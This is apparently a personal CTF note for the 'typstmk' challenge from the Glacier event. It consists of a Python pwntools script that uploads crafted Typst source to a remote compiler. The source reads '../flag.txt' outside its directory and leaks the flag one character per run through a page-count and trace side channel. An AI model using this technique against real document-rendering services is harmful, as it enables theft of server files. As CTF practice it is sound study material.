---
type: challenge
event: glacier
name: typstmk
category: misc
note: "[[Random#Typst]]"
solved: ✅
---


Solution:
```python
def upload(doc: str):
    enc = base64.b64encode(doc)
    io.sendlineafter(b"--- BASE64 INPUT START ---", enc)
    io.sendline(b"@")
    io.recvuntil(b"--- BASE64 INPUT END ---")
    io.recvuntil(b"Received")

FILE = """
#let n = read("0.json").len()

#if n <= 0 [
  #for i in range(read("../flag.txt").at({index}).to-unicode() - 1) [
    #lorem(100)
    #pagebreak()
  ]
] else [
  #set text(size: 6pt)
  #let j = json("0.json")

  #for i in j [
    #if i.name == "handle page" and i.ph == "B" [
        #i.name #linebreak()
    ]
  ]
]
"""

flag = ""

i = 0
while flag == "" or flag[-1] != '}':

    io = start()

    upload(FILE.format(index=i).encode())

    io.recvuntil(b"[+] --- BASE64 OUTPUT START ---\n", timeout=5)
    pdf = io.recvuntil(b"[+] --- BASE64 OUTPUT END ---\n").decode().strip()
    pdf = pdf.replace("[+] --- BASE64 OUTPUT END ---", "")
    io.recvuntil(b"main.pdf\n")

    with open("out", "w") as f:
        f.write(pdf)

    # All I know is bash
    c = int(os.popen(f"cat out | base64 -d | tar -xOz | pdftotext - - | grep -c handle").read().strip())

    flag += chr(c)
    log.info(flag)
    i += 1
    io.close()

log.success(flag)
```

